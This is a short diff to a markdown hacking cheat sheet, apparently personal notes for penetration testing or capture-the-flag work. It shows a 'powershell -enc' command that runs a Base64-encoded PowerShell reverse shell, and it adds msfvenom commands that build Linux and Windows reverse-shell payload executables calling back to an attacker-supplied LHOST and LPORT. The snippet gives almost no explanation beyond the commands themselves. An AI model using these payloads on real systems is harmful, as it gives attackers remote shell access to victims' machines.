@@ -54,8 +54,16 @@ $EncodedText
 ```bash
 powershell -enc <our Base64 encoded Powershell revshell>
 ```
-Powershell Simple HTTP Server (Doesn't seem to work after testing):
-https://www.powershellgallery.com/packages/Start-WebServer/1.1/Content/Start-WebServer.ps1
+### msfvenom
+For when your existing shell is kinda shit, upgrade it to an msfvenom one: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+Linux:
+```bash
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+```
+Windows:
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+```
 
 ## SOCAT
 
